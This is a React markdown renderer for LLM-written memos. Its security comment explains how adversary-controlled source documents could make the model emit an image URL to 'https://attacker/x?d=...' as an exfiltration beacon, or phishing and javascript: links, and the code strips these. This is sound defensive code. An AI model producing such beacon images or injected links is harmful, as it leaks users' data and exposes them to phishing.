import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

/**
 * Renders memo markdown (GFM tables + bold) with Tailwind Typography styling.
 * Table styling is tuned for the findings table the memo contains.
 *
 * SECURITY: memo markdown is LLM-generated from documents an adversary controls,
 * so it is treated as untrusted:
 *   - raw HTML is not rendered (no rehype-raw), so this is not a script sink;
 *   - images are dropped — an `![](https://attacker/x?d=...)` would otherwise be
 *     auto-fetched by the browser, a silent exfiltration/injection-confirmation
 *     beacon; a memo has no need for images;
 *   - link URLs are restricted to http/https/mailto (blocks javascript:/data:),
 *     and links open with rel="noopener noreferrer nofollow" so an injected
 *     phishing link can't abuse the opener or borrow the memo's trust for SEO.
 */
const safeUrl = (url: string): string => {
  const trimmed = url.trim();
  if (/^(https?:|mailto:|#|\/)/i.test(trimmed)) return trimmed;
  return ""; // strip anything else (javascript:, data:, vbscript:, …)
};

export function Markdown({ children }: { children: string }) {
  return (
    <div className="prose prose-sm max-w-none dark:prose-invert prose-headings:font-semibold prose-headings:tracking-tight prose-h2:text-xl prose-h3:text-base prose-p:text-muted prose-strong:text-foreground prose-table:text-sm prose-th:text-left prose-td:align-top prose-a:text-primary">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        urlTransform={safeUrl}
        disallowedElements={["img"]}
        unwrapDisallowed
        components={{
          a: ({ node, ...props }) => (
            <a {...props} target="_blank" rel="noopener noreferrer nofollow" />
          ),
        }}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
